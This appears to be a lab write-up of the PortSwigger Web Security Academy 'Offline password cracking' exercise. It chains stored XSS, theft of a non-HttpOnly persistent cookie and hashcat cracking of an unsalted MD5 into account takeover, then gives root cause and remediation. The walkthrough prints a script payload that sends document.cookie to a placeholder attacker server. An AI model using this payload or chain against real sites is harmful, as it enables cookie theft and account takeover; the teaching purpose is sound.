# Account Takeover by Chaining Stored XSS, Cookie Theft, and Offline Password Cracking

- **Vulnerability class:** Stored XSS + insecure persistent-auth design (CWE-79, CWE-522, CWE-916)
- **Target:** PortSwigger Web Security Academy, *Offline password cracking* (a deliberately-vulnerable lab)
- **Impact:** Full account takeover, achieved by recovering the victim's plaintext password offline.

---

## Summary
The application's "stay logged in" cookie was built as `base64(username + ':' + md5(password))`
using an unsalted MD5 and was **not** marked `HttpOnly`. A stored XSS vulnerability in the
comment feature let me exfiltrate a victim's cookie to a server I controlled, decode it, and
crack the password hash offline. Because the attack never touches the login endpoint, it
bypasses every online rate-limit and lockout protection.

## Walkthrough
1. **Reverse-engineered the persistent cookie.** Logging in with "stay logged in" set a cookie
   that base64-decoded to `username:51dc30dd...`. The second field was a 32-character hex
   string; `md5("mypassword")` matched it, confirming the construction
   `base64(username:md5(password))`.
2. **Confirmed stored XSS.** The comment field rendered attacker input without encoding. I
   posted a comment containing:

   ```html
   <script>document.location='//ATTACKER-SERVER/'+document.cookie</script>
   ```
   Because the cookie was not `HttpOnly`, `document.cookie` could read it from JavaScript.
3. **Captured the victim's cookie.** When the victim viewed the comment, their browser sent
   their `stay-logged-in` cookie to my server, where it appeared in the access log.
4. **Decoded and cracked offline.** Base64-decoding gave `carlos:26323c16d5f4dabff3bb136f2460a943`.
   Running the unsalted MD5 against a wordlist with hashcat recovered the plaintext in seconds.
5. **Took over the account.** I logged in as the victim with the recovered password and
   performed a privileged action, confirming full takeover.

## Impact
An attacker who can land stored XSS can harvest any victim's persistent-auth cookie, recover
the plaintext password offline, and fully take over the account. Offline cracking means no
login attempts are made, so account-lockout and rate-limiting never trigger.

## Root cause
Three compounding weaknesses:
- **Stored XSS** allowed arbitrary JavaScript to run in victims' sessions.
- The persistent cookie was **not `HttpOnly`**, exposing it to that JavaScript.
- The cookie was **derived from the password** using a fast, unsalted hash (MD5), making it
  trivially crackable once stolen.

## Remediation
- Remediate the XSS with contextual output encoding and a restrictive Content-Security-Policy.
- Set `HttpOnly`, `Secure`, and `SameSite` on session and persistent-auth cookies.
- Never derive a persistent-auth token from the password, and never store a password as an
  unsalted fast hash. Use a random, server-side session identifier instead.

## Methodology takeaway
When a "remember me" / persistent token is present, **decode it and reverse-engineer its
construction** before anything else. A token derived from a password hash becomes an offline
cracking target, and offline attacks sidestep every online defense. The broader lesson is to
**chain primitives**: a single stored XSS plus a weak cookie design plus a fast hash combine
into full account takeover, far beyond the impact of any one of them alone.
